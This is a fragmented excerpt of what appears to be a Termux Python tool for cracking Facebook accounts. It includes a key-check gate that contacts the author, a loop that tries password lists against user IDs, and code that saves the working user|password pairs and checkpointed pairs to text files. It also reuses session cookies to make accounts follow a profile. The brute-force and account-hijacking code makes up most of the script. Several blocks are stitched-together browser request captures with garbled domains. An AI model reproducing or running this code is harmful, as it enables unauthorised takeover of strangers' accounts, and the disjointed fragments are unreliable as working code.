...
def logo():
	print("""%s
  \033[31;1m ✩𝐍𝐀𝐘𝐄𝐄𝐌 𝐓𝐎𝐑 𝐁𝐀𝐁𝐀 𝐋𝐀𝐆𝐄 ✵𝐎𝐍𝐀𝐋𝐘 𝐅𝐎𝐑 𝐇𝐀𝐓𝐄𝐑𝐀𝐒🤬 \033[31;1m
\033[38;5;46m███    ██ ██    ██ ███████ ███████ ███    ███  \033[31;1m
\033[38;5;46m████   ██  ██  ██  ██      ██      ████  ████  \033[31;1m
\033[38;5;46m██ ██  ██   ████   █████   █████   ██ ████ ██  \033[31;1m
\033[38;5;46m██  ██ ██    ██    ██      ██      ██  ██  ██  \033[31;1m
\033[38;5;46m██   ████    ██    ███████ ███████ ██      ██  \033[31;1m
...
def reg():
    os.system('termux-setup-storage')
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/profile.php?id=100004052541589&mibextid=ZbWKwL')
    logo()
    print ('')
    ...
    try:
        ...
        reg2()
    r = requests.get('https://github.com/nayeemvai/NAYEEM-AFROBAL/blob/main/Afroveal.txt').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
        ...
        print("               COPY AND SEND KEY TO ADMIN Nayeem  ")
        ...
        os.system('am start https://wa.me/+88801827673253?text=' + tks)
        reg()
...
def chigozie():
    ...
    try:
        ...
        os.system('xdg-open https://wa.me/+8801827673253')
        bsn_menu()
...
def bsn_menu():
    ...
    IP = ipm["origin"]
    print("             [*]. CREATED BY : 𝗡𝗔𝗬𝗘𝗘𝗠 𝗡𝗔𝗪𝗔𝗭CYBER [99] ");time.sleep (0.03)
    print("             [*]. FACEBOOK   : 𝗡𝗔𝗬𝗘𝗘𝗠 𝗡𝗔𝗪𝗔𝗭 ");time.sleep (0.03)
    print("             [*]. GITHUB     : 𝗡𝗔𝗬𝗘𝗘𝗠𝗩𝗔𝗜 ");time.sleep (0.03)   
...
class __bsn__:
    ...
    def __api__(self, user, __chi__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [𝗡𝗔𝗬𝗘𝗘𝗠] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
            ...
            if "access_token" in p:
                print('\r [OK-NAYEEM] %s | %s ' % (user,pw))
                wrt = '%s|%s' % (user,pw)
                ok.append(wrt)
                open('𝗡𝗔𝗬𝗘𝗘𝗠-ok.txt' , 'a').write('%s\n' % wrt)
                break
                ...
                try:
                    ...
                    print('\r%s \033[1;91m[CP-NAYEEM] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('𝗡𝗔𝗬𝗘𝗘𝗠-cp.txt' , 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f'\r [NHC] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
...
headers = {
    ...
    # 'cookie': 'datr=o5uXZMdSi6BWPQSh8pM-HbAd; sb=o5uXZPtYuZ4Vd3khcQSz9sOC',
...
response = requests.get(
    'https://mbasic .facebook.com/?zero_e=3&zero_et=1687188733&_rdc=1&_rdr&refsrc=deprecated',
    cookies=cookies,
    headers=headers,
)
params = {
    'q': 'mbasic .facebook.com unlock',
    'oq': 'mbasic ',
    'aqs': 'chrome.7.69i57j0i131i433i512j5j0i131i433i512j0i10i512j5i44j0i131i433i512l2j0i512l2.3244j0j1',
...
response = requests.get('https://m.facebook.com/?_rdr', cookies=cookies, headers=headers)

params = {
    'q': 'mbasic .facebook.cοm',
    'oq': 'mbasic .',
    'aqs': 'chrome.2.69i57j0i512j0i131i433i512j5i44l2j0i512j5i10i44l2j5i44j0i512.13092j0j1',
    'sourceid': 'chrome-mobile',
    'ie': 'UTF-8',
}
...
params = {
    'q': 'mbasic .facebook.cοm',
    'oq': 'mbasic .',
    'aqs': 'chrome.2.69i57j0i10i512j0i10i131i433i512j5i10i44l5j0i10i512l2.20716j0j1',
    'sourceid': 'chrome-mobile',
    'ie': 'UTF-8',
}

response = requests.get('https://mbasic .facebook.cοm/search', params=params, cookies=cookies, headers=headers)

params = {
    'q': 'mbasic .facebook.cοm',
    'oq': 'mbasic .',
    'aqs': 'chrome.2.69i57j0i512j0i131i433i512j5i44l2j0i512j5i10i44l2j5i44j0i512.9617j0j1',
    'sourceid': 'chrome-mobile',
    'ie': 'UTF-8',
}
...
params = {
    'q': 'mbasic .facebook.cοm',
    'oq': 'mbasic .',
    'aqs': 'chrome.2.69i57j0i512j0i131i433i512j0i512j5i44l2j0i512j5i10i44l2j5i44.23123j0j1',
    'sourceid': 'chrome-mobile',
    'ie': 'UTF-8',
}
...
response = requests.get('https://mbasic .facebook.cοm/search', params=params, cookies=cookies, headers=headers)
    ...
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
    'x-client-data': 'CJDrygEIk9vMAQ==',
}

params = {
    'q': 'mbasic facebook com friends requests outgoing',
    'oq': '',
    'aqs': 'chrome.1.69i176j69i59i450l3.-1j0j1',
    'sourceid': 'chrome-mobile',
    'ie': 'UTF-8',
}
...
response = requests.get('https://mbasic .facebook.cοm/search', params=params, cookies=cookies, headers=headers)
    ...
    def follow(self,session,coki):
        r = BeautifulSoup(session.get("https://mbasic .facebook.com/profile.php?id=100003982384780",cookies={"cookie":coki}).text,"html.parser")
